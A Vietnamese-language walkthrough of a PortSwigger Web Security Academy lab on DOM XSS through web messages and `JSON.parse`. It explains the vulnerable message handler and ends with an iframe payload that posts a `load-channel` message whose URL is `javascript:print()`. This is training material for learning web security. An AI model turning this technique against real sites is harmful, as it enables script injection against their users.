# DOM XSS using web messages and `JSON.parse`

Tiếp tự Ctrl+U cho chúng ta thấy đoạn mã sau

![image](https://user-images.githubusercontent.com/68894302/175645963-736eaaf8-3106-4772-a39d-9cb46650b3a2.png)

Nếu window nhận được message thì nó sẽ tạo một phần tử iframe và thêm vào trang web hiện tại. Trình phân tích cú pháp `JSON.parse` sẽ so sánh các case trong trường hợp này chính là key trong json để thực hiện các hành động tiếp theo.

Theo docs của Mozilla hiển thị cú pháp để send message vào đối tượng window của iframe như sau:

```
postMessage(message, targetOrigin)
postMessage(message, targetOrigin, transfer)
```

Chúng ta thấy targetOrigin là một url đích hoặc sử dụng dấu `*` thay cho tên đầy đủ của url đó. Tập lệnh chứa lỗ hổng có thể khai thác là các `type` json hợp lệ trong message. Nó luôn chứa một loại key có thể là `page-load`, `load-channel` hoặc `player-height-changed` 

Chúng ta có thể khai thác `load-channel` khi một key url được tải lên và được load vào iframe. Không có kiểm tra làm sạch input đầu vào nên chúng ta có thể tải lên json như sau

```
{
    "type": "load-channel", 
    "url": "javascript:print()"
}
```

Nhưng sử dụng dấu ngoặc sao cho hợp lí, vì trong challenge này để craft được iframe thì chúng ta cần ít nhất 3 dấu đóng mở ngoặc kép. Trong định nghĩa tài liệu [rfc7159](https://datatracker.ietf.org/doc/html/rfc7159#page-8) thì đối với JSON mọi key và giá trị của nó phải được đặt trong dấu ngoặc kép `"` 

Payload như sau:
```
<iframe src="https://0a9600bd0435c0d4c042448a00c0008b.web-security-academy.net/" onload='contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*");'></iframe>
```

![image](https://user-images.githubusercontent.com/68894302/175652465-414103f5-6f7f-4c98-bcbe-57f65e62b3e7.png)

